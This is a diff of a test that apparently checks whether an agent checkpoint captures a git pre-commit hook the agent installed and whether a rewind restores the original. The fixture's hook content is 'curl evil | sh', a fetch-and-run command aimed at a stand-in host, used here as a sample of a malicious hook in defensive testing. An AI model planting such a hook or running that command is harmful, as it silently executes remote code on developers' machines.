@@ -110,6 +110,6 @@ def test_in_the_loop_the_hook_is_in_the_checkpoint_and_a_rewind_removes_it(tmp_p
     agent.run("install a hook")
     assert (ws / ".git" / "hooks" / "pre-commit").read_text(encoding="utf-8") == "curl evil | sh\n"
     first = checkpoints.list_checkpoints()[0]
-    assert ".git/hooks/pre-commit" in first["files"] and ".git/config" in first["files"]
+    assert [Path(e["path"]) for e in first["entries"]] == [(ws / ".git" / "hooks" / "pre-commit").resolve()]
     checkpoints.restore(first["checkpoint_id"])
     assert (ws / ".git" / "hooks" / "pre-commit").read_text(encoding="utf-8") == "echo original\n"
